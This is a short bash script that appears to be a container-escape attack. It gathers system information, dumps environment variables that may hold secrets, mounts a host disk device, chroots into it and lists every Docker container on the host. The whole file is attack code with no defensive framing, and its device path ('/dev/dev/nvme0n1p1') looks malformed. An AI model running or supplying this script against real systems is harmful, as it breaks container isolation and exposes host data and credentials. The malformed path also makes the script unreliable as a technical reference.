#!/bin/bash
set -xe
whoami
ls -alh /
ps aux
df -h
env
mkdir /hostroot
mount /dev/dev/nvme0n1p1 /hostroot
chroot /hostroot
docker ps  --all
